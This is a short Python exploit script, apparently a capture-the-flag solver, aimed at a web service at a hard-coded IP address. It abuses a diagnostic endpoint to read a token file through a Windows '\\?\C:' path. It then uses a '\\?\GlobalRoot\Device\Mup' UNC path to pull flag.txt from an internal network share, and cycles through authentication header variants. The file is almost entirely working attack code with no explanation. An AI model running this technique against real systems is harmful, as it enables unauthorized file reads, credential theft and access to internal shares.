import requests

BASE_URL = "http://1.95.51.2:8080"
PATH = r"\\?\GlobalRoot.\Device\Mup\172.20.0.10\backup\flag.txt"

def get_token():
    try:
        r = requests.get(f"{BASE_URL}/api/diag/read", params={"path": r"\\?\C:\token\access_key.txt"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token")
    except:
        pass
    return None

def check():
    api_token = get_token()
    print(f"Token: {api_token}")
    file_token = "PathMaze2026SecureToken"
    full_key = "ACCESS_KEY:PathMaze2026SecureToken"
    
    if not api_token: return

    # Try various header combinations
    headers_list = [
        {"Authorization": f"Bearer {file_token}"},
        {"Authorization": f"Bearer {api_token}"},
        {"X-Access-Token": file_token},
        {"X-Token": file_token},
        {"Token": file_token},
        {"Cookie": f"token={file_token}"}
    ]

    print(f"Testing path: {PATH}")
    
    # Base request (API token in query)
    print("--- API Token in Query ---")
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": PATH, "token": api_token}, timeout=10)
        print(f"Status: {r.status_code}")
        if r.status_code == 200: print(r.text)
    except Exception as e: print(e)

    # File token in query
    print("--- File Token in Query ---")
    try:
        r = requests.get(f"{BASE_URL}/api/export/read", params={"path": PATH, "token": file_token}, timeout=10)
        print(f"Status: {r.status_code}")
        if r.status_code == 200: print(r.text)
    except Exception as e: print(e)

    # Headers test (with API token in query as anchor)
    print("--- Headers Test ---")
    for h in headers_list:
        try:
            r = requests.get(f"{BASE_URL}/api/export/read", params={"path": PATH, "token": api_token}, headers=h, timeout=10)
            if r.status_code != 401:
                print(f"Header {h} -> {r.status_code} {r.text[:100]}")
        except: pass
